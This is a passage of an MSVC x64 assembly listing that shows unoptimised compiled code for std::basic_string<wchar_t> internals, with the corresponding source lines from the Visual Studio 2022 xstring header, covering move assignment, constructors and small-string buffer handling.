; 3118 : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 3119 : 
; 3120 : #ifdef _INSERT_STRING_ANNOTATION
; 3121 :                 if (!_Right_data._Large_string_engaged()) {
; 3122 :                     _ASAN_STRING_REMOVE(_Right);
; 3123 :                 }
; 3124 : #endif // _INSERT_STRING_ANNOTATION
; 3125 : 
; 3126 :                 _Memcpy_val_from(_Right);

	mov	rdx, QWORD PTR _Right$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Memcpy_val_from@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEBV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Memcpy_val_from

; 3127 : 
; 3128 : #ifdef _INSERT_STRING_ANNOTATION
; 3129 :                 if (!_Right_data._Large_string_engaged()) {
; 3130 :                     _ASAN_STRING_REMOVE(_Right);
; 3131 :                     _ASAN_STRING_CREATE(*this);
; 3132 :                 }
; 3133 : #endif // _INSERT_STRING_ANNOTATION
; 3134 : 
; 3135 :                 _Right._Tidy_init();

	mov	rcx, QWORD PTR _Right$[rsp]
	call	?_Tidy_init@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_init

; 3136 :                 return;

	jmp	$LN1@Take_conte

; 3137 :             }
; 3138 :         }
; 3139 : 
; 3140 :         if (_Right_data._Large_string_engaged()) { // steal buffer

	mov	rcx, QWORD PTR _Right_data$[rsp]
	call	?_Large_string_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_string_engaged
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN2@Take_conte

; 3141 :             _Construct_in_place(_My_data._Bx._Ptr, _Right_data._Bx._Ptr);

	mov	rax, QWORD PTR _Right_data$[rsp]
	mov	rcx, QWORD PTR _My_data$[rsp]
	mov	rdx, rax
	call	??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z ; std::_Construct_in_place<wchar_t *,wchar_t * &>

; 3142 :             _Right_data._Bx._Ptr = nullptr;

	mov	rax, QWORD PTR _Right_data$[rsp]
	mov	QWORD PTR [rax], 0

; 3143 :             _Swap_proxy_and_iterators(_Right);

	mov	rdx, QWORD PTR _Right$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Swap_proxy_and_iterators

; 3144 :         } else { // copy small string buffer

	jmp	SHORT $LN3@Take_conte
$LN2@Take_conte:

; 3145 : #if _HAS_CXX20
; 3146 :             if (_STD is_constant_evaluated()) { // begin the lifetime of the array elements before copying into them
; 3147 :                 _Construct_in_place(_Mypair._Myval2._Bx);
; 3148 :             }
; 3149 : #endif // _HAS_CXX20
; 3150 :             _Traits::copy(_My_data._Bx._Buf, _Right_data._Bx._Buf, _Right_data._Mysize + 1);

	mov	rax, QWORD PTR _Right_data$[rsp]
	mov	rax, QWORD PTR [rax+16]
	inc	rax
	mov	rcx, QWORD PTR _Right_data$[rsp]
	mov	rdx, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR tv93[rsp], rdx
	mov	r8, rax
	mov	rdx, rcx
	mov	rax, QWORD PTR tv93[rsp]
	mov	rcx, rax
	call	?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 3151 :             _Right_data._Orphan_all();

	mov	rcx, QWORD PTR _Right_data$[rsp]
	call	?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all
$LN3@Take_conte:

; 3152 :         }
; 3153 : 
; 3154 :         _My_data._Mysize = _Right_data._Mysize;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Right_data$[rsp]
	mov	rcx, QWORD PTR [rcx+16]
	mov	QWORD PTR [rax+16], rcx

; 3155 :         _My_data._Myres  = _Right_data._Myres;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Right_data$[rsp]
	mov	rcx, QWORD PTR [rcx+24]
	mov	QWORD PTR [rax+24], rcx

; 3156 :         _Right._Tidy_init();

	mov	rcx, QWORD PTR _Right$[rsp]
	call	?_Tidy_init@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_init
	npad	1
$LN1@Take_conte:

; 3157 :     }

	add	rsp, 72					; 00000048H
	ret	0
?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Take_contents
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Memcpy_val_from@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEBV12@@Z
_TEXT	SEGMENT
_Right_data_mem$ = 32
_My_data_mem$ = 40
this$ = 64
_Right$ = 72
?_Memcpy_val_from@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEBV12@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Memcpy_val_from, COMDAT

; 3088 :     void _Memcpy_val_from(const basic_string& _Right) noexcept {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 3089 :         _STL_INTERNAL_CHECK(_Can_memcpy_val);
; 3090 :         const auto _My_data_mem =

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >
	mov	QWORD PTR _My_data_mem$[rsp], rax

; 3091 :             reinterpret_cast<unsigned char*>(_STD addressof(_Mypair._Myval2)) + _Memcpy_val_offset;
; 3092 :         const auto _Right_data_mem =

	mov	rax, QWORD PTR _Right$[rsp]
	mov	rcx, rax
	call	??$addressof@$$CBV?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEBV?$_String_val@U?$_Simple_types@_W@std@@@0@AEBV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > const >
	mov	QWORD PTR _Right_data_mem$[rsp], rax

; 3093 :             reinterpret_cast<const unsigned char*>(_STD addressof(_Right._Mypair._Myval2)) + _Memcpy_val_offset;
; 3094 :         _CSTD memcpy(_My_data_mem, _Right_data_mem, _Memcpy_val_size);

	mov	r8d, 32					; 00000020H
	mov	rdx, QWORD PTR _Right_data_mem$[rsp]
	mov	rcx, QWORD PTR _My_data_mem$[rsp]
	call	memcpy

; 3095 :     }

	add	rsp, 56					; 00000038H
	ret	0
?_Memcpy_val_from@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEBV12@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Memcpy_val_from
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@$$QEAV01@@Z
_TEXT	SEGMENT
_Pocma_val$ = 32
_Right_al$ = 40
_Al$ = 48
this$ = 80
_Right$ = 88
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@$$QEAV01@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=, COMDAT

; 3055 :         _Choose_pocma_v<_Alty> != _Pocma_values::_No_propagate_allocators) {

$LN4:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 3056 :         if (this == _STD addressof(_Right)) {

	mov	rcx, QWORD PTR _Right$[rsp]
	call	??$addressof@V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEAV10@@Z ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > >
	cmp	QWORD PTR this$[rsp], rax
	jne	SHORT $LN2@operator

; 3057 :             return *this;

	mov	rax, QWORD PTR this$[rsp]
	jmp	SHORT $LN1@operator
$LN2@operator:

; 3058 :         }
; 3059 : 
; 3060 :         auto& _Al                 = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 3061 :         auto& _Right_al           = _Right._Getal();

	mov	rcx, QWORD PTR _Right$[rsp]
	call	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
	mov	QWORD PTR _Right_al$[rsp], rax

; 3062 :         constexpr auto _Pocma_val = _Choose_pocma_v<_Alty>;

	mov	DWORD PTR _Pocma_val$[rsp], 0

; 3063 :         if constexpr (_Pocma_val == _Pocma_values::_Propagate_allocators) {
; 3064 :             if (_Al != _Right_al) {
; 3065 :                 // intentionally slams into noexcept on OOM, TRANSITION, VSO-466800
; 3066 :                 _Mypair._Myval2._Orphan_all();
; 3067 :                 _Mypair._Myval2._Reload_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Al), _GET_PROXY_ALLOCATOR(_Alty, _Right_al));
; 3068 :             }
; 3069 :         } else if constexpr (_Pocma_val == _Pocma_values::_No_propagate_allocators) {
; 3070 :             if (_Al != _Right_al) {
; 3071 :                 assign(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);
; 3072 :                 return *this;
; 3073 :             }
; 3074 :         }
; 3075 : 
; 3076 :         _Tidy_deallocate();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate

; 3077 :         _Pocma(_Al, _Right_al);

	mov	rdx, QWORD PTR _Right_al$[rsp]
	mov	rcx, QWORD PTR _Al$[rsp]
	call	??$_Pocma@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@0@Z ; std::_Pocma<std::allocator<wchar_t> >

; 3078 :         _Take_contents(_Right);

	mov	rdx, QWORD PTR _Right$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Take_contents

; 3079 :         return *this;

	mov	rax, QWORD PTR this$[rsp]
$LN1@operator:

; 3080 :     }

	add	rsp, 72					; 00000048H
	ret	0
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@$$QEAV01@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z
_TEXT	SEGMENT
$T1 = 32
this$ = 64
_Right$ = 72
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2837 :         : _Mypair(_One_then_variadic_args_t{}, _STD move(_Right._Getal())) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rcx, QWORD PTR _Right$[rsp]
	call	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
	mov	rcx, rax
	call	??$move@AEAV?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z ; std::move<std::allocator<wchar_t> &>
	mov	rcx, QWORD PTR this$[rsp]
	mov	r8, rax
	movzx	edx, BYTE PTR $T1[rsp]
	call	??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >

; 2838 :         _Mypair._Myval2._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));

	mov	rax, QWORD PTR this$[rsp]
	lea	rdx, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
	mov	rcx, rax
	call	?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy

; 2839 :         _Take_contents(_Right);

	mov	rdx, QWORD PTR _Right$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Take_contents

; 2840 :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z
_TEXT	SEGMENT
$T1 = 32
this$ = 64
_Ptr$ = 72
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2621 :     _CONSTEXPR20 basic_string(_In_z_ const _Elem* const _Ptr) : _Mypair(_Zero_then_variadic_args_t{}) {

$LN4:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rax, QWORD PTR this$[rsp]
	movzx	edx, BYTE PTR $T1[rsp]
	mov	rcx, rax
	call	??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>
	npad	1

; 2622 :         _Construct<_Construct_strategy::_From_ptr>(_Ptr, _Convert_size<size_type>(_Traits::length(_Ptr)));

	mov	rcx, QWORD PTR _Ptr$[rsp]
	call	?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z ; std::_WChar_traits<wchar_t>::length
	mov	rcx, rax
	call	??$_Convert_size@_K@std@@YA_K_K@Z	; std::_Convert_size<unsigned __int64>
	mov	r8, rax
	mov	rdx, QWORD PTR _Ptr$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
	npad	1

; 2623 :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
this$ = 64
_Ptr$ = 72
?dtor$0@?0???0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z@4HA PROC ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	call	??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z@4HA ENDP ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
$T1 = 32
$T2 = 33
this$ = 64
_Right$ = 72
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2586 :         : _Mypair(_One_then_variadic_args_t{}, _Alty_traits::select_on_container_copy_construction(_Right._Getal())) {

$LN4:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rcx, QWORD PTR _Right$[rsp]
	call	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
	mov	rdx, rax
	lea	rcx, QWORD PTR $T1[rsp]
	call	?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
	mov	rcx, QWORD PTR this$[rsp]
	mov	r8, rax
	movzx	edx, BYTE PTR $T2[rsp]
	call	??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >
	npad	1

; 2587 :         _Construct<_Construct_strategy::_From_string>(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

	mov	rax, QWORD PTR _Right$[rsp]
	mov	rcx, rax
	call	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
	mov	rcx, QWORD PTR _Right$[rsp]
	mov	r8, QWORD PTR [rcx+16]
	mov	rdx, rax
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
	npad	1

; 2588 :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 33
this$ = 64
_Right$ = 72
?dtor$0@?0???0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z@4HA PROC ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	call	??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z@4HA ENDP ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
_TEXT	SEGMENT
$T1 = 32
this$ = 64
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2575 :         : _Mypair(_Zero_then_variadic_args_t{}) {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rax, QWORD PTR this$[rsp]
	movzx	edx, BYTE PTR $T1[rsp]
	mov	rcx, rax
	call	??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>

; 2576 :         _Mypair._Myval2._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));

	mov	rax, QWORD PTR this$[rsp]
	lea	rdx, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
	mov	rcx, rax
	call	?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy

; 2577 :         _Tidy_init();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Tidy_init@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_init

; 2578 :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >, COMDAT
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
	add	rsp, 40					; 00000028H
	ret	0
??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty, COMDAT

; 2313 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers

	mov	QWORD PTR [rsp+8], rcx
	ret	0
??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty, COMDAT

; 2311 :         _CONSTEXPR20 _Bxty() noexcept : _Ptr() {} // user-provided, for fancy pointers

	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax], 0
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Large_string_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ
_TEXT	SEGMENT
tv66 = 0
this$ = 32
?_Large_string_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_string_engaged, COMDAT

; 2278 :     _CONSTEXPR20 bool _Large_string_engaged() const noexcept {

$LN5:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 2279 : #if _HAS_CXX20
; 2280 :         if (_STD is_constant_evaluated()) {
; 2281 :             return true;
; 2282 :         }
; 2283 : #endif // _HAS_CXX20
; 2284 :         return _BUF_SIZE <= _Myres;

	mov	rax, QWORD PTR this$[rsp]
	cmp	QWORD PTR [rax+24], 8
	jb	SHORT $LN3@Large_stri
	mov	DWORD PTR tv66[rsp], 1
	jmp	SHORT $LN4@Large_stri
$LN3@Large_stri:
	mov	DWORD PTR tv66[rsp], 0
$LN4@Large_stri:
	movzx	eax, BYTE PTR tv66[rsp]

; 2285 :     }

	add	rsp, 24
	ret	0
?_Large_string_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_string_engaged
_TEXT	ENDS
